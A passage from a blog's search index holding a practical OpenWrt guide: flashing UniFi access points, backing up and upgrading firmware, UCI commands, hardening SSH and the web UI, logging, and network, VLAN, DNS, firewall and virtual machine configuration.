<li>Save, then enter <code>uci commit wireless; wifi</code></li> <li>Now you can connect to an existing wireless network as if this were a laptop or any other device<ul> <li>Via GUI (see Network Chuck's video referenced above.)</li> <li>Via <code>/etc/config/wireless</code> (see the text config directly below)</li> </ul> </li> </ul> <pre><code>config wifi-device 'radio0'\n        option type 'mac80211'\n        option path 'platform/soc/your/unique/device/path/here'\n        option channel '36'\n        option band '5g'\n        option htmode 'VHT80'\n        option disabled '0'\n        option country 'US'\n        option cell_density '0'\n\nconfig wifi-iface 'wifinet0'\n        option device 'radio0'\n        option mode 'sta'\n        option network 'wwan'\n        option ssid 'YOUR-ESSID'\n        option encryption 'psk2'\n        option key '&lt;your-wifi-password&gt;'\n</code></pre> <p>Now you can <code>ping 1.1.1.1</code> and <code>google.com</code>. At this point, reboot and make sure you can ssh back in, and everything works.</p> <p>Once you're logged back in, run <code>opkg update</code> (OpenWrt's <code>apt update</code> equivalent), then install the following packages for external / USB wireless card support.</p> <pre><code>opkg update\nopkg install nano usbutils kmod-usb2 kmod-usb-core kmod-usb-ohci kmod-usb-uhci kmod-rt2800-lib kmod-rt2800-usb kmod-rt2x00-lib kmod-rt2x00-usb\n\n# Initially the mt7x kernel modules weren't visible in opkg, run another update if that's the case\nopkg update\nopkg install kmod-mt76-usb kmod-mt76x2u\n</code></pre> <p>You do not need to reboot here, the device will be visible in the output of <code>ip link | grep DOWN</code>.</p> <p>Do the same as the first wireless card, and delete the default wifi config from <code>/etc/config/wireless</code> or the GUI, save, then scan the local area using the new card. You should see results, proving the card works.</p> <p>Migrate an Existing Config</p> <p>Wireless Card Limitations</p> <p>Virtual AP functionality, or creating multiple ESSIDS tied to the same wireless radio, can be limited depending on 1) if the card supports it, and 2) if OpenWrt has a kernel driver that can use the functionality.</p> <p>A primary use case is migrating your OpenWrt config to a new device. If the target device is different hardware from the source device, you will need to do some manual editing.</p> <ul> <li>The hardware for each <code>radioX</code> under <code>/etc/config/wireless</code> will not match your existing configs</li> <li>It's best to copy and paste items from <code>/etc/config/*</code> into the new install from a shell, reviewing and making adjustments as necessary</li> <li>This way you can determine what will work or not, before running a <code>reboot</code></li> </ul>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#installing-openwrt-on-a-unifi-ap","title":"Installing OpenWrt on a UniFi AP:","text":"<p>The following link has extensive documentation on these devices and multiple installation methods:</p> <ul> <li>https://openwrt.org/toh/ubiquiti/unifiac</li> </ul> <p>The following steps I've found to be the easiest and most reliable combination.</p> <ul> <li>Use the <code>&lt;name&gt;-sysupgrade.bin</code> image to do full upgrades of the device firmware</li> <li>UniFi default ssh creds: <code>ubnt::ubnt</code> <code>ubnt@192.168.1.20</code></li> <li>OpenWrt default ssh creds: <code>root::root</code> <code>root@192.168.1.1</code></li> <li>When using IPv6 ssh: <code>ssh ubnt@fe80::x:x:x%eth0</code></li> <li>When using IPv6 scp: <code>scp /source/file/path ubnt@[fe80::x:x:x%eth0]:/dest/file/path</code></li> </ul> <p>NOTE: Always use /tmp/ as the working directory for upgrades, backups, and restoring configurations</p> <p>If UniFi device still has stock firmware higher than version 3.7.58: - Download your device's UniFi firmware image for version 3.7.58 - Copy it to the UniFi device: <code>scp &lt;firmware-name&gt;.bin ubnt@[fe80::x:x:x%eth0]:/tmp/</code> - Connect to the UniFi device:<code>ssh ubnt@fe80::x:x:x%eth0</code> - Flash the version 3.7.58 firmware:<code>fwupdate.real -m /tmp/ubnt.bin</code></p> <p>If you happen to disconnect during the process, the firmware write will still contiue on the UniFi device as long as it has power.</p> <p>Proceed to the next step once the device is running firmware version 3.7.58</p> <p>If UniFi device has stock firmware version 3.7.58: - Copy the OpenWrt firmware to the UniFi-device <code>scp openwrt-ath79-generic-ubnt_unifiac-XXX-squashfs-sysupgrade.bin ubnt@192.168.1.20:/tmp/</code> - Connect to the UniFi device: - Write the OpenWrt firmware to the first kernel partition: <code>mtd write /tmp/openwrt-xxxxx-squashfs-sysupgrade.bin kernel0</code> - Erase the second kernel partition: <code>mtd erase kernel1</code> - <code>cat /proc/mtd | grep \"bs\"</code>, expected result is <code>mtd4</code>, if it's not, make note and use that value in the next command - Use the obtained partition name for bs here if it was not <code>mtd4</code>: <code>dd if=/dev/zero bs=1 count=1 of=/dev/mtd4</code> - Reboot</p> <p>Now you can connect to using the default OpenWrt values: <code>ssh -L 8000:127.0.0.1:80 root@192.168.1.1</code></p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#upgrading-to-new-release-targets","title":"Upgrading to New Release Targets","text":"<p>NOTE: Always use /tmp/ as the working directory for upgrades, backups, and restoring configurations</p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#1-backup-your-configuration","title":"1. Backup your configuration","text":"<p>Edit the backup configuration, note that the contents may be different from that of <code>sysupgrade -l</code> output. <pre><code>vi /etc/sysupgrade.conf\n\n/etc/config/dropbear\n/etc/config/firewall\n/etc/config/network\n/etc/config/system\n/etc/config/uhttpd\n/etc/config/wireless\n/etc/dropbear/\n/etc/passwd\n/etc/shadow\n</code></pre></p> <p>Verify the backup configuration <pre><code>sysupgrade -l\n</code></pre></p> <p>Generate a backup <pre><code>umask go=\nsysupgrade -b /tmp/backup-${HOSTNAME}-$(date +%F).tar.gz\n\n# Get the hash of the backup archive\nsha256sum /tmp/backup-*\n\n# Download this backup to your PC before power cycling / upgrading the OpenWrt device or it will be erased\nscp root@&lt;ip&gt;:/tmp/backup-*.tar.gz .\n\n# Check the hash locally to make sure the backup configuration is OK\nsha256sum ./backup-* | grep &lt;hash&gt;\n</code></pre></p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#2-perform-the-upgrade","title":"2. Perform the upgrade","text":"<p>A note on keeping configurations:</p> <p>You can choose to keep your current configuration, from OpenWrt v21.x and later you may never have an issue with this.</p> <p>However, if a configuration becomes corrupt during an upgrade, or the configuration syntax changes in the future, it's recommended to erase the configuration during the upgrade, and resore it afterwords.</p> <p>IMPORTANT: This can create an impossible situation when performing upgrades remotely, without physical access to reprovision the device, it will not be reachable over the wire</p> <p>Two possible solutions for entirely remote upgrades to OpenWrt AP's:</p> <ul> <li>Maintain the configuration<ul> <li>There's always a risk it will break, as with any remote upgrade</li> <li>No additional work needed once the upgrade is complete</li> <li>You'll encounter the least issues with same version upgrades (22.01 -&gt; 22.02)</li> </ul> </li> <li>Create an OpenWrt image set to a static IP in the range you require upon factory reset<ul> <li>This is because bridged AP's would never have the 192.168.1.1 address.</li> <li>Requires creating a custom OpenWrt firmware image</li> <li>Will work automatically and be reachable over the wire after factory resets</li> </ul> </li> </ul> <p>Performing the upgrade: <pre><code>scp &lt;sysupgrade.bin&gt; root@&lt;ip&gt;:/tmp/      # must be /tmp/ as flash storage is unmounted during upgrades\nssh root@&lt;ip&gt;\nsha256sum /tmp/*.bin                      # be sure the files's signature uploaded to the AP matches your local copy\nsysupgrade -v /tmp/*.bin                  # preserve settings\nsysupgrade -n -v /tmp/*.bin               # factory default settings\n</code></pre></p> <p>If you're conducting this upgrade remotely or over WiFi you'll likely see:</p> <pre><code>&lt;datetime&gt; upgrade: Commencing upgrade. Closing all shell sessions.\nCommand failed: Connection failed\nroot@OpenWrt:/tmp# Connection to &lt;openwrt-ip&gt; closed by remote host.\nConnection to &lt;openwrt-ip&gt; closed.\n</code></pre> <p>If you're physically near the AP, you may see the device's indicator lights signalling an upgrade is happening.</p> <p>If you cannot physically see the AP, watch the list of access points on the machine you'll be reconnecting from until it comes back online.</p> <ul> <li>'TRX header' errors can be safely ignored</li> <li>If the device is unresponsive after an upgrade, wait 5 minutes before dis/re-connecting power to the device</li> </ul> <p>In cases where you're either 1) connected directly to the AP or 2) have a shell on a device directly connected to the AP and the AP can obtain a DHCP lease in that subnet:</p> <ul> <li>Using <code>tcpdump</code> with <code>-Q in</code> you'll be able to see when the device is back online based on the traffic and MAC addresses (you may need to know the MAC address).</li> </ul> <p>In all cases, once the device is back online you'll be able to reconnect over ssh to confirm the upgrade succeeded when the ssh banner prints the current version.</p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#3-restore-your-configuration","title":"3. Restore your configuration","text":"<p>Automated restore process: <pre><code>scp &lt;backup-*.tar.gz&gt; root@&lt;ip&gt;:/tmp/\nssh root@&lt;ip&gt;\nsysupgrade -r /tmp/backup-*.tar.gz\n</code></pre></p> <p>You can manually restore a configuration over the CLI with <code>vi</code> and <code>copy/paste</code>.</p> <p>In the future if either: 1) A configuration file becomes corrupted and is causing issues with the system, or 2) There's been a change in the way OpenWrt reads configuration files as part of a difference in upgrade to a newer verison</p> <p>NOTE: configuration files can be edited freely, until you run <code>/etc/init.d/&lt;service&gt; restart</code> your changes won't be loaded.</p> <ul> <li>Leave the default <code>lan</code> interface in <code>/etc/config/network</code> alone until the end</li> <li><code>vi /etc/config/network</code><ul> <li>Drop in your configurations (you can copy / paste over ssh)</li> <li>Make any adjustments to what you've just added based on what you see in the defaults</li> </ul> </li> <li><code>vi /etc/config/wireless</code><ul> <li>Optionally change SSID names</li> <li>Optionally leave both radio's disabled</li> </ul> </li> <li><code>vi /etc/dropbpar/authorized_keys</code><ul> <li>Add any ssh public keys</li> </ul> </li> <li><code>vi /etc/config/uhttpd</code><ul> <li>Modifying the listening interface(s) of the uhttpd</li> </ul> </li> <li><code>/etc/init.d/network restart</code></li> </ul> <p>Ensure your settings were restored: <pre><code>cat /etc/config/wireless\ncat /etc/dropbear/authorized_keys\n</code></pre></p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#uci","title":"UCI","text":"<pre><code>uci [&lt;options&gt;] &lt;command&gt; [&lt;args&gt;]\n</code></pre> <p>NOTE: Applying changes via the <code>uci</code> command will wipe any comments from configuration files being modified.</p> <p>To maintain any notations or <code>#</code> comments modify the file manually with <code>vi</code></p> <pre><code>uci set uhttpd.main.listen_http='8080'\nuci commit uhttpd\n/etc/init.d/uhttpd restart\n</code></pre> <p>Viewing configurations for a select subsystem:</p> <p>Available subsystems are: - defaults - dnsmasq - dropbear - firewall - fstab - net - qos - samba - system - wireless</p> <pre><code>uci show &lt;subsystem&gt;\n\nuci show dropbear\n</code></pre> <p>Setting a configuration in a subsystem:</p> <pre><code>uci add firewall rule\nuci set firewall.@rule[-1].src='wan'\n</code></pre> <p>Showing the not-yet-saved modified values</p> <pre><code>uci changes\n</code></pre> <p>Saving modified values of a single subsystem <pre><code>uci commit SUBSYSTEM_NAME\nreload_config\n</code></pre></p> <p>Saving all modified values <pre><code>uci commit\nreload_config\n</code></pre></p> <p>Generate a UCI section via batch script that can be copy/pasted into terminal:</p> <pre><code># https://openwrt.org/docs/guide-user/base-system/uci#generating_a_full_uci_section_with_a_simple_copy-paste\n\nrule_name=$(uci add firewall rule)\nuci batch &lt;&lt; EOI\nset firewall.$rule_name.enabled='1'\nset firewall.$rule_name.target='ACCEPT'\nset firewall.$rule_name.src='wan'\nset firewall.$rule_name.proto='tcp'\nset firewall.$rule_name.dest_port='22'\nset firewall.$rule_name.name='SSH'\nEOI\nuci commit\n</code></pre>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#administration","title":"Administration","text":"<p>A factory install / reset of OpenWrt has open ssh / http access on the LAN, but wireless radios are disabled by default.</p> <p>This prevents taking over an unconfigured device wirelessly.</p> <p>Set the root password <pre><code>passwd\n</code></pre></p> <p>Protect the serial TTY <pre><code>uci set system.@system[0].ttylogin='1'\nuci commit system\n/etc/init.d/system restart\n</code></pre></p> <p>View configuration <pre><code>cat /etc/config/network\ncat /etc/config/wireless\n# or\nuci show wireless\nuci show network\n</code></pre></p> <p>View wireless card's regulatory information <pre><code>iw reg get\n</code></pre></p> <p>List network interfaces <pre><code>ifconfig\nip a\nubus list network.interface.*\n</code></pre></p> <p>Enumerate a specific interface <pre><code>ifstatus &lt;iface&gt;\n</code></pre></p> <p>Enumerate sockets (BusyBox specific syntax, no <code>-A</code> option) <pre><code>netstat -antup\n</code></pre></p> <p>View authorized ssh keys <pre><code>cat /etc/dropbear/authorized_keys\n</code></pre></p> <p>Enable MFA for SSH <pre><code># https://openwrt.org/docs/guide-user/services/ssh/ssh.mfa.auth\nopkg install google-authenticator-libpam openssh-server-pam\n</code></pre></p> <p>Manage services <pre><code>service list\nservice &lt;service&gt; stop\nservice &lt;service&gt; start\nservice &lt;service&gt; reload\nservice &lt;service&gt; disable\nservice &lt;service&gt; enable\n\nservice rpcd disable\nservice dnsmasq disable\nservice dropbear start\nservice uhttp reload\n</code></pre></p> <p>Reload and reinitialize configurations <pre><code>service &lt;service&gt; reload\nservice network reload\n# or\n/etc/initi.d/&lt;service&gt; restart\n/etc/init.d/network restart\n</code></pre></p> <p>NOTE: some <code>/etc/config/wireless</code> settings will reload in real time when edited with <code>vi</code>, such as <code>option isolate '1'</code></p> <p>Other settings such as MAC address filtering <code>list maclist</code> will require <code>/etc/init.d/network restart</code></p> <p>Regenerate factory wireless configuration <pre><code># https://openwrt.org/docs/guide-user/network/wifi/basic#regenerate_configuration\nrm -f /etc/config/wireless\nwifi config\n</code></pre></p> <p>Enumerate free memory space <pre><code>free\n</code></pre></p> <p>Verify read-only SquashFS root partition exits <pre><code>grep squash /proc/mounts\n</code></pre></p> <p>Harden Web-UI access and authentication via ssh tunneling <pre><code># Add ssh public key to /etc/config/dropbear/authorized_keys\n\n# Replace the http(s) listening addresses of [::] with [::1] and 0.0.0.0 with 127.0.0.1\nvi /etc/config/uhttpd\n\nservice uhttpd reload\n\n# confirm changes:\nnetstat -antup\n</code></pre></p> <p>Find all non-volatile files that have changed on the filesystem in the last 24 hours: <pre><code>find / -type f -mtime -1 | grep -Ev \"/(tmp|sys|proc)\"\n</code></pre></p> <p>Package management <pre><code># update all packages, do this after every power cycle\n# and before installing or searching for new packages\nopkg update\n\n# search for a package\nopkg list | grep &lt;regex-for-package-name&gt;\nopkg list | grep 'nmap*'\n\n# show package details\nopkg info nmap-full\n\n# install packages\nopkg install nmap-full netcat tcpdump nano wireguard-tools kmod-wireguard git python3 scapy tmux audit\n</code></pre></p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#remote-management","title":"Remote Management","text":"<p>Tailscale on OpenWrt</p> <p>Tailscale is available in the default OpenWrt package repos.</p> <pre><code>opkg update\nopkg install tailscale\n</code></pre> <p>Configure the ACLs to allow the necessary devices access to the web UI securely over Tailscale.</p> <p>SSH Tunnel via Tailscale</p> <p>If your device doesn't have room to install <code>tailscale</code> using <code>opkg</code>, you can use a jump box with Tailscale running to create an SSH tunnel to the web UI.</p> <ul> <li>First create a passphrase-protected SSH key that will live on the jump box with <code>ssh-keygen -t ed25519</code></li> <li>Add the public key to <code>/etc/dropbear/authorized_keys</code> on OpenWrt</li> <li>Ensure inbound SSH connections are allowed to OpenWrt</li> <li>From the jump box: <code>ssh -f -N -i ~/.ssh/my-openwrt-key -L &lt;tailscale0-ip&gt;:8081:127.0.0.1:80 root@&lt;openwrt-ip&gt;</code></li> <li>You can of course use any VPN, not just Tailscale here</li> </ul> <p>This will open a tunnel in the background, allowing you to reach the OpenWrt device from the jump box via <code>&lt;tailscale0-ip&gt;:8081</code>. Some additional points:</p> <ul> <li><code>-f -N</code> tell SSH to run in the background without executing commands</li> <li>This will need executed again each time the SSH connection breaks (OpenWrt or jump box reboots)</li> <li>The risk here is giving the jump box access to the AP, though this may be acceptible in most cases</li> </ul>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#logging","title":"Logging","text":"<p>Syslog writes to a small membuffer, which is why you won't find the typical (large) <code>/var/log/*</code> files where they normally are.</p> <p>Use <code>logread</code> to review logs for the system applications, and <code>dmesg</code> for kernel level logs.</p> <p>View all dropbear activity: <pre><code>logread -e 'dropbear'\n</code></pre></p> <p>View dnsmasq logs: <pre><code>logread -e 'dnsmasq'\n</code></pre></p> <p>TO DO: further logging configuration.</p> <p>As of now, it seems syslog and kern.log are only accessible via the LuCI web interface.</p> <p>You can copy/paste the syslog output into a text file to parse locally: <pre><code>grep 'auth' &lt;openwrt.log&gt;\ngrep 'succeed' &lt;openwrt.log&gt;\ngrep 'fail' &lt;openwrt.log&gt;\n</code></pre></p> <p>Log Examples</p> <p>uhttpd logs: <pre><code>Tue Jan  1 08:30:00 2021 daemon.err uhttpd[2000]: luci: failed login on / for root from 127.0.0.1\nTue Jan  1 08:30:00 2021 daemon.err uhttpd[2000]: luci: accepted login on / for root from 127.0.0.1\n</code></pre></p> <p>Dropbear logs: <pre><code>Tue Jan  1 08:30:00 2021 authpriv.notice dropbear[3348]: Pubkey auth succeeded for 'root' with key sha1!! aa:bb:cc:dd:ee:ff:11:22:33:44:55:66:77:88:99:00:a1:a2:a3:a4 from 192.168.1.82:53878\nTue Jan  1 08:30:00 2021 authpriv.info dropbear[3348]: Exit (root) from &lt;192.168.1.82:53878&gt;: Disconnect received\n</code></pre></p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#networking","title":"Networking","text":"<ul> <li>https://openwrt.org/docs/guide-quick-start/checks_and_troubleshooting</li> <li>https://openwrt.org/docs/guide-user/base-system/basic-networking</li> <li>https://openwrt.org/docs/guide-user/network/routing/routes_configuration</li> <li>https://openwrt.org/docs/guide-user/base-system/dhcp</li> <li>https://openwrt.org/docs/guide-user/base-system/dhcp_configuration</li> </ul> <p>The following three sections are one network configuration file, broken into three parts to show each part as a template.</p> <p>The default loopback and globals: <pre><code>config interface 'loopback'\n    option device 'lo'\n    option proto 'static'\n    option ipaddr '127.0.0.1'\n    option netmask '255.0.0.0'\n\nconfig globals 'globals'\n    option ula_prefix 'f123:xxxx:xxxx::/48'\n</code></pre></p> <p>A phyiscal interface: <pre><code>config device\n    option name 'br-lan'\n    option type 'bridge'\n    list ports 'eth0'\n\nconfig interface 'lan'\n    option device 'br-lan'\n    option proto 'static'\n    option ipaddr '192.168.1.1'\n    option netmask '255.255.255.0'\n    option ip6assign '60'\n</code></pre></p> <p>A vlan: <pre><code>config device\n    option name 'br-vlan1'\n    option type 'bridge'\n    list ports 'eth0.110'\n\nconfig device\n    option type '8021q'\n    option name 'eth0.110'\n    option ifname 'eth0'\n    option vid '110'\n\nconfig interface 'vlan1'\n    option device 'br-vlan1'\n    option proto 'static'\n    option ipaddr '172.16.1.100'\n    option netmask '255.255.255.0'\n    option gateway '172.16.1.1'\n    list dns '172.16.1.1'\n</code></pre></p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#dns","title":"DNS","text":"<p>You can either setup OpenWrt to resolve DNS queries with <code>dnsmasq</code> (default built in resolver daemon), or add a remote DNS server to <code>/etc/resolv.conf</code>.</p> <p>1. Adding an entry to /etc/resolv.conf</p> <p>Taking our DNS server of 10.0.2.105 from before, add it to the top of <code>/etc/resolv.conf</code> beneath 'search lan' <pre><code>nameserver 10.0.2.105\n</code></pre></p> <p>2. Telling dnsmasq to use the upstream dns server</p> <pre><code># https://openwrt.org/docs/guide-user/base-system/dhcp_configuration#dns_forwarding\n\nuci -q delete dhcp.@dnsmasq[0].server\nuci add_list dhcp.@dnsmasq[0].server=\"10.0.2.105\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n</code></pre> <p>The <code>/etc/config/network</code> example at:</p> <p>https://openwrt.org/docs/guide-user/network/dsa/dsa-mini-tutorial#multiple_bridged_networks</p> <p>illustrates exactly how to configure a network with multiple isolated subnets.</p> <p>The idea with DSA is devices and interfaces are now broken into separate configuration blocks within the config file.</p> <p>Subnets, or bridges in this case, cannot talk to eachother without firewall rules allowing the traffic to happen.</p> <p>You'll note the <code>wan</code> interface is less explicit in it's parameters since most of that information will come from the downstream router / gateway.</p> <p>The internal <code>lan</code> and <code>guest</code> interfaces have more prescriptive definitions.</p> <p>Below is a working example of an OpenWrt VM with 3 NICs attached.</p> <ul> <li><code>eth0</code> = <code>wan</code></li> <li><code>eth1</code> = <code>lan</code></li> <li><code>eth2</code> = <code>guest</code></li> </ul> <pre><code>config interface 'loopback'\n    option device 'lo'\n    option proto 'static'\n    option ipaddr '127.0.0.1'\n    option netmask '255.0.0.0'\n\nconfig globals 'globals'\n    option ula_prefix 'fd8a:xxxx:xxxx::/48'\n\nconfig device\n    option name 'br-wan'\n    option type 'bridge'\n    list ports 'eth0'\n\nconfig device\n    option name 'br-lan'\n    option type 'bridge'\n    list ports 'eth1'\n\nconfig device\n    option name 'br-guest'\n    option type 'bridge'\n    list ports 'eth2'\n\nconfig interface 'wan'\n    option device 'br-wan'\n    option proto 'dhcp'\n\nconfig interface 'wan6'\n    option device 'br-wan'\n    option proto 'dhcpv6'\n\nconfig interface 'lan'\n    option device 'br-lan'\n    option proto 'static'\n    option ipaddr '192.168.111.101'\n    option netmask '255.255.255.0'\n    option gateway '192.168.111.1'\n    option dns '192.168.111.1'\n\nconfig interface 'guest'\n    option device 'br-guest'\n    option proto 'static'\n    option ipaddr '192.168.222.101'\n    option netmask '255.255.255.0'\n    option gateway '192.168.222.1'\n    option dns '192.168.222.1'\n</code></pre>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#wireless","title":"Wireless","text":"<ul> <li>https://openwrt.org/docs/guide-user/network/wifi/basic</li> <li>https://en.wikipedia.org/wiki/List_of_WLAN_channels</li> <li>https://www.ecfr.gov/current/title-47</li> </ul>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#country-code-and-regulatory-requirements","title":"Country Code and Regulatory Requirements","text":"<p>As mentioned above under administration for how to obtain your wireless card's regulatory info, once the country code is set under <code>/etc/config/wireless</code> the device will only allow settings in compliance with that country's regulations.</p> <p>OpenWrt uses the CRDA database to do this which is part of the Linux kernel.</p> <ul> <li>https://wireless.wiki.kernel.org/en/developers/Regulatory#crda</li> </ul> <pre><code>config wifi-device 'radio0'\n    ...\n    option country '&lt;country-code&gt;'\n</code></pre> <p>Be aware you must still comply with the maximum transmission power (<code>txpower</code>) for your locale, taking into account indoor and outdoor operation.</p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#wireless-channels","title":"Wireless Channels","text":"<p>In many devices, setting the channel to <code>auto</code> will select the lowest available channel regardless of local signal density.</p> <pre><code>config wifi-device 'radio0'\n    ...\n    option channel '&lt;channel&gt;'\n</code></pre> <p>You can use the script detailed in the following link to automatically select the channel with the least density:</p> <ul> <li>https://openwrt.org/docs/guide-user/network/wifi/iwchan</li> </ul> <p>Alternatively from the WebUI you can view the wireless density in your area as a graph under <code>System &gt; Status &gt; Channel Analysis</code>.</p> <p>This scan will also create a list of all observed wireless devices operating under the same 2.4/5 GHz frequency.</p> <p>From here change your wireless radio('s) channel to the least populated.</p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#virtualization","title":"Virtualization","text":"<ul> <li>https://openwrt.org/docs/guide-user/virtualization/vmware</li> <li>https://openwrt.org/docs/guide-user/virtualization/virtualbox-vm</li> </ul>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#qemu-utils","title":"qemu-utils","text":"<p>Using qemu-utils is the quickest way to create an OpenWrt VM.</p> <pre><code>sudo apt install -y qemu-utils\n</code></pre> <p>Obtain the OpenWrt signatures for x86/64, replacing  with the one you want: <pre><code>curl -LfO 'https://downloads.openwrt.org/releases/&lt;version&gt;/targets/x86/64/sha256sums.asc'\ncurl -LfO 'https://downloads.openwrt.org/releases/&lt;version&gt;/targets/x86/64/sha256sums'\n</code></pre> <p>On the <code>https://downloads.openwrt.org/releases/&lt;version&gt;/targets/x86/64/</code> page you'll see a few different images to choose from:</p> <ul> <li>generic-ext4-combined-efi.img.gz    &lt;- this is the image we want</li> <li>generic-ext4-combined.img.gz</li> <li>generic-ext4-rootfs.img.gz</li> <li>generic-kernel.bin</li> <li>generic-squashfs-combined-efi.img.gz</li> <li>generic-squashfs-combined.img.gz</li> <li>generic-squashfs-rootfs.img.gz</li> <li>rootfs.tar.gz</li> </ul> <p>If you want the UEFI compatible image (recommended), use <code>generic-ext4-combined-efi.img.gz</code> instead of <code>generic-ext4-combined.img.gz</code>. <pre><code>curl -LfO 'https://downloads.openwrt.org/releases/21.02.1/targets/x86/64/openwrt-21.02.1-x86-64-generic-ext4-combined-efi.img.gz'\n</code></pre></p> <p>Obtain the signing key, verifying the signatures: <pre><code># https://openwrt.org/docs/guide-user/security/signatures\n\n# 21.02\ngpg --keyid-format long --keyserver hkps://keyserver.ubuntu.com:443 --recv-keys '6672 05E3 79BA F348 863A 5C66 88CA 59E8 8F68 1580'\ngpg --verify --keyid-format long ./sha256sums.asc ./sha256sums\n\n# 22.03\ngpg --keyid-format long --keyserver hkps://keyserver.ubuntu.com:443 --recv-keys 'BF85 6781 A012 93C8 409A BE72 CD54 E82D ADB3 684D'\ngpg --verify --keyid-format long ./sha256sums.asc ./sha256sums\n</code></pre></p> <p>Verify the firmware hash: <pre><code>sha256sum -c ./sha256sums --ignore-missing\n</code></pre></p> <p>You must use <code>gunzip</code> to properly unzip the data. The GUI archive utilites don't handle the trailing empty data correctly: <pre><code>gunzip openwrt-21.02.1-x86-64-generic-ext4-combined-efi.img.gz\n</code></pre></p> <p>TIP: Once the .img file is decompressed, you can <code>right-click &gt; mount image filesystem</code> (this uses the Image Disk Utility on Ubuntu) and browse the firmware's filesystem under <code>/media/$USERNAME/rootfs</code> and <code>/media/$USERNAME/kernel</code></p> <p>Convert the raw image to a vmdk file:</p> <pre><code>qemu-img convert -f raw -O vmdk &lt;input-file&gt;.img &lt;output-file&gt;.vmdk\n</code></pre>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#vmware-virtualbox","title":"VMware &amp; VirtualBox","text":"<p>VirtualBox - <code>Tools &gt; Add</code> and browser to the .vmdk file - If the OpenWrt .vmdk file is not available to select here, create a new <code>Tools &gt; New</code> Linux / Other x86-64 virtual machine, and when selecting a disk image use the existing OpenWrt .vmdk. - Power on. When the boot sequence looks like it's paused, pressing [Enter] will bring you to the root shell / login screen.</p> <p>VMware - Follow a similar procedure in VMware, creating a new Linux / Other x86-64 VM, choosing the Linux Kernel that your version of OpenWrt has, and selecting the .vmdk file as an existing disk when you get to that option. - It may also help organize your virtual machine's files on your hard drive by moving the .vmdk file into the VM's folder after creating it in VMware. - You'll need to create a new hard disk under settings and point it at the .vmdk file's new path, then delete the old one (you cannot just update the path on your host).</p> <p>In both cases, remember to enable EFI firmware if it's an EFI enabled image.</p> <p>You'll also receive a notice on VMware Workstation for Linux the VM is entering promiscuous networking mode.</p> <p>After boot, the startup log will eventually stop scrolling - press [Enter] here to be at the console menu</p> <p>You will likely need to configure <code>/etc/config/network</code> manually if the output of <code>ip a</code> or <code>ifconfig</code> indicates a hardcoded address of 192.168.1.1 on a bridged interface without receiving dhcp from the local network.</p> <p>To do this:</p> <pre><code>vi /etc/config/network\n\n# ensure the following exists\nconfig device\n    option name 'br-wan'\n    option type 'bridge'\n    list ports 'eth0'\n\nconfig interface 'wan'\n    option device 'br-wan'\n    option proto 'dhcp'\n</code></pre> <p>The <code>option proto dhcp</code> will allow OpenWrt to obtain an IP address from the upstream router.</p> <p>If you run into errors, double check the syntax of your <code>/etc/config/network</code> for single <code>'</code> quotes where needed, and no repeated lines in the wrong code blocks.</p> <p>You may also want to add a second networking interface to act as the 'LAN' side, following the configuration example above:</p> <pre><code>vi /etc/config/network\n\n# assumes 'wan' is eth0, so 'lan' will be eth1\nconfig device\n    option name 'br-lan'\n    option type 'bridge'\n    list ports 'eth1'\n\nconfig interface 'lan'\n    option device 'br-lan'\n    option proto 'static'\n    option ipaddr '192.168.10.1'\n    option netmask '255.255.255.0'\n</code></pre> <p>Alternatively, set a single NIC to be a 'client' and receive a DHCP lease from a downstream router.</p> <p>Instead of those above, the only changes are removing the following lines from <code>config interface 'lan'</code>: <pre><code>    option proto 'static'\n    option ipaddr '192.168.1.1'\n    option netmask '255.255.255.0'\n</code></pre></p> <p>And replacing them with: <pre><code>    option proto 'dhcp'\n</code></pre></p> <p>Run <code>/etc/init.d/network restart</code> to apply the config.</p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#bridged-ap","title":"Bridged AP","text":"<p>You do not need to configure firewall rules, routes, dns, or non-wireless settings when OpenWrt is acting as a bridged access point.</p> <p>All of these services are handled by the downstream router.</p> <p>You can safely disable the following services:</p> <p>Disable dnsmasq</p> <ul> <li><code>/etc/init.d/dnsmasq disable</code></li> <li><code>System &gt; Startup &gt; dnsmasq</code></li> </ul> <p>Disable odhcp</p> <ul> <li><code>/etc/init.d/odhcpd disable</code></li> <li><code>System &gt; Startup &gt; odhcp</code></li> </ul> <p>Apply changes <pre><code>/etc/init.d/network reload\nifup wifi\nwifi\n</code></pre></p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#firewall","title":"Firewall","text":"<p>The default firewall rules can be found in <code>/etc/config/firewall</code>.</p> <p>Dump them with <code>iptables</code> or <code>nftables</code></p> <ul> <li>https://openwrt.org/docs/guide-user/firewall/misc/nftables</li> </ul> <p>Example configuration syntax enabling SSH access from the WAN side:</p> <pre><code># Allow external SSH access\nconfig rule\n    option name         Allow-SSH-WAN\n    option src          wan\n    option proto        tcp\n    option dest_port    22\n    option target       ACCEPT\n    option family       ipv4\n</code></pre> <p>Run <code>/etc/init.d/firewall restart</code> to apply the rule.</p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#vlan","title":"VLAN","text":"<ul> <li>https://openwrt.org/docs/guide-user/network/vlan/switch_configuration</li> </ul> <p>Example configurations of VLANS:</p> <pre><code># /etc/config/network\n\nconfig device\n    option name 'br-lan'\n    option type 'bridge'\n    list ports 'lan1'\n    list ports 'lan2'\n    list ports 'lan3'\n    list ports 'lan4'\n\nconfig bridge-vlan\n    option device 'br-lan'\n    option vlan '1'\n    list ports 'lan1'\n    list ports 'lan2'\n\nconfig bridge-vlan\n    option device 'br-lan'\n    option vlan '2'\n    list ports 'lan3'\n    list ports 